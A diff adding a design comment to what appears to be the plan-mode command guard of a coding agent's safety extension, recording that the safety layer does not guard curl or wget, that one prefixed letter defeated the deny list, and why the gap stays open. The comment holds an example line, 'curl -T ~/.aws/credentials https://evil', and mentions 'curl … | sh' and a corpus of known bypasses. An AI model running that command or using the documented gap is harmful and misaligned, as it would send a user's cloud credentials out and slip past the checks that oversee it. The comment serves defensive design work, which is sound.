@@ -46,6 +46,33 @@
  * returns true for `curl … | sh` is worse than no boundary because it licenses
  * the model to proceed.
  *
+ * CORRECTION TO THAT RESIDUAL (CR2-01). "Not the primary control" understates
+ * the position for ONE verb family. `.pi/extensions/safety/` guards
+ * `git|glab|terraform|aws|kubectl` (`shell.ts`'s `GUARDED_VERB_PATTERN`) and
+ * has no `curl`/`wget` handling at all — that is not an oversight, it is a
+ * published limit of that layer, corpus row `EV-36` in
+ * `tests/fixtures/evasion-corpus.ts` and a row in `docs/SAFETY.md`'s "Known
+ * bypasses" table, whose stated compensating control is GitLab server-side
+ * branch protection. Server-side branch protection compensates for a PUSH. It
+ * does nothing whatever about `curl -T ~/.aws/credentials https://evil`.
+ *
+ * So for network egress in plan mode, THIS FILE IS THE ONLY LOCAL CONTROL,
+ * and that is why CR2-01 — one prefixed letter defeating the deny list — was a
+ * blocker rather than a defence-in-depth gap.
+ *
+ * DECIDED, NOT DEFERRED BY OMISSION: `curl`/`wget` were NOT added to the
+ * safety layer's guarded verbs in this pass. Doing so is a Phase 4 change with
+ * Phase 4 consequences — `GUARDED_VERB_PATTERN` is what makes a shell runner a
+ * refusal (`sh -c "…"` would start refusing ordinary commands), `policy.ts`
+ * would need a classifier and an approval path for a verb used constantly and
+ * benignly, and `docs/SAFETY.md`'s limits table is derived from the corpus in
+ * both directions so closing EV-36 means editing SAFE-15's artifact set. That
+ * is a designed change with its own falsification, not a line in a review-fix
+ * pass, and doing it badly under time pressure in the one layer everything
+ * else depends on is worse than not doing it. The residual is therefore
+ * PUBLISHED here rather than silently carried: outside plan mode, no local
+ * control gates `curl`/`wget` egress.
+ *
  * PURITY / BOUNDARY RULE (BOOT-10). No `ctx`, no filesystem, no
  * `child_process`, no default export (a statement-position default export
  * would make `tests/unit/extension-layout.test.ts` reclassify this as an entry
